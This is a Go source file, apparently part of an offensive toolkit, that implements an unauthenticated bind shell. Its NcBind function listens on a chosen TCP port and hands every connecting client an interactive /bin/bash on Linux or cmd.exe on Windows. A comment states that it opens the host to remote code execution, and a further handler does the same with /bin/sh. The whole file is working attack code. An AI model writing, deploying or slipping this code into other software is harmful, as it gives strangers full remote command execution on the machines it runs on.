package serverbind

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

func OperatingSystemDetect() *string {
	// Return the operating system runtime
	var osRuntime string = runtime.GOOS
	return &osRuntime
}

// Bind to local port, open up host to remote code execution
func NcBind(mappedUserInput map[string]string) {
	var (
		port      string = mappedUserInput["port"]
		address   string = fmt.Sprintf(":%s", port)
		osRuntime string = runtime.GOOS
	)

	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalf("Unable to bind to port %s", address)
	}
	switch osRuntime {
	case "linux":
		for {
			conn, err := listener.Accept()
			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
			if err != nil {
				log.Fatalln("Unable to accept connection.")
			}
			go SimpleHandleLinux(conn)
		}
	case "windows":
		for {
			conn, err := listener.Accept()
			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
			if err != nil {
				log.Fatalln("Unable to accept connection.")
			}
			go SimpleHandleWindows(conn)
		}
	default:
		fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
		os.Exit(1)
	}
}

// Flusher wraps bufio.Writer, explicitly flushing on all writes
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates a new Flusher from an io.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// Write writes bytes and explicitly flushes buffer
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func DifficultHandle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	// For Windows use exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin for our connection
	cmd.Stdin = conn

	// Write writes bytes and explicitly flushes buffer
	cmd.Stdout = NewFlusher(conn)

	// Run the command
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func SimpleHandleLinux(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	cmd := exec.Command("/bin/bash", "-i")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func SimpleHandleWindows(conn net.Conn) {
	// Explicitly calling cmd.exe for cmd execution
	// so that we can use it for stdin and stdout
	cmd := exec.Command("cmd.exe")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}
